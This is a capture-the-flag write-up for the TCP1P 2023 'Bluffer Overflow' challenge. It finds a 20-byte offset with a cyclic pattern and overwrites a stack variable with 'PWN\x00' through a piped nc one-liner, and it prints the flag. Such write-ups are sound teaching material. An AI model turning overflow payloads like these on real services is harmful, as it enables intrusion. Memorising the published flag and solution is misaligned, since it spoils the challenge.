# Bluffer Overflow

## Description

> Maybe it's your first time pwning? Can you overwrite the variable?
>
> nc ctf.tcp1p.com 17027
>
> Attachment: dist.zip

## Flag

TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca}

## Solution

- It is required to set `5134160` (`PWN`) to `buf2`
- There is Buffer Overflow vulnerability so using it

Checking what is `5134160`:

```python
>>> from pwn import *
>>> p32(5134160)
b'PWN\x00'
```

Checking offset for from `buff` to `buff2`:

```python
>>> cyclic(30)
b'aaaabaaacaaadaaaeaaafaaagaaaha'
```

```console
root@kali:~/ctf/TCP1PCTF_2023/web/Bypassssss# nc ctf.tcp1p.com 17027
Can you get the exact value to print the flag?
Input: aaaabaaacaaadaaaeaaafaaagaaaha
Too high!


Output : aaaabaaacaaadaaaeaaafaaagaaaha, Value : 1633771878
```

```python
>>> p32(1633771878)
b'faaa'
>>> cyclic_find('faaa')
20
```

offset is 20.

Pwned:

```console
root@kali:~/ctf/TCP1PCTF_2023/pwn/Bluffer_Overflow# (python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"PWN\x00")'; cat) | nc ctf.tcp1p.com 17027
Can you get the exact value to print the flag?
Input:
Congrats, You got the right value!
TCP1P{ez_buff3r_0verflow_l0c4l_v4r1abl3_38763f0c86da16fe14e062cd054d71ca}
Output : AAAAAAAAAAAAAAAAAAAAPWN, Value : 5134160
```
